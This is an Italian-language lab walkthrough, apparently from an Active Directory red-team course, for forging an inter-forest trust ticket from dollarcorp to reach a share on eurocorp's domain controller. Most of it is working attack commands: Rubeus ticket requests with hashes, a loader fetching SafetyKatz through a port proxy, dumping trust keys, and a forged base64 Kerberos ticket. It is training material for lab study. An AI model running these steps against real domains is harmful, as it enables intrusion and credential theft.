# LEARNING OBJECTIVE20

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* With DA privileges on dollarcorp.moneycorp.local, get access to\
  SharedwithDCorp share on the DC of eurocorp.local forest.

### SVOLGIMENTO

Abbiamo bisogno della Trust Key per il Trust tra dollarcorp ed eurocrop, che può essere recuperata utilizzando Mimikatz o SafetyKatz.

Avvia un processo con privilegi DA. Esegui il comando seguente da un prompt dei comandi con privilegi elevati:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Eseguire i comandi riportati di seguito dal processo in esecuzione come DA per copiare <kbd>Loader.exe</kbd> su <kbd>dcorp-dc</kbd> e utilizzarlo per estrarre le credenziali:

```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```

```powershell
winrs -r:dcorp-dc cmd
```

```powershell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.60
```

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```

<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-3333069040-3914854601-3606488808)&#x20;

\[ In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL \* 1/7/2026  aes256\_hmac 23df8571befd7d46b6a6f47e8c6649edc14e8b918f4ea3356670fd5772a7eb8d

aes128\_hmac deb46b2287ccc580c26306d912a198ba

rc4\_hmac\_nt 5a23bfe4dfb6732431395b3286dbcff1

Possiamo adesso creare il Silverticket per accedere il dominio <kbd>eurocorp.local</kbd>

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:5a23bfe4dfb6732431395b3286dbcff1 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap
```

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

Copiare il ticket codificato in base64 sopra riportato e utilizzalo nel seguente comando:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket: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
```

<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

Ora dopo aver importato il Ticket Kerberos possiamo accedere <kbd>eurocorp.moneycorp.local</kbd>&#x20;

```powershell
dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```

```
type \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt
```

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

Si noti che l'unico modo per enumerare le risorse accessibili (servizio su una macchina) in eurocorp sarebbe quello di richiedere un TGS per ciascuna di esse e quindi tentare di accedervi.
